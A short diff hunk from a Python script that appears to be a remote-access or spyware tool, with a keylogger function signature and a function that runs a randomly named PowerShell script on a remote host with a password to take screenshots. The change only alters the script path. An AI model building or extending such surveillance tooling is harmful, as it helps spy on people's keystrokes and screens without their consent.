@@ -169,7 +169,7 @@ def keylogger(address, password, username, working):
 def take_screenshot(address, password, working):
     # take screenshot
     print("\n[*] Taking screenshot...")
-    screenshot = f"./{working}/SbQRViPjIq.ps1"
+    screenshot = f"{working}/SbQRViPjIq.ps1"
     remote_command(address, password, screenshot)
     print("[+] Screenshot taken")
 
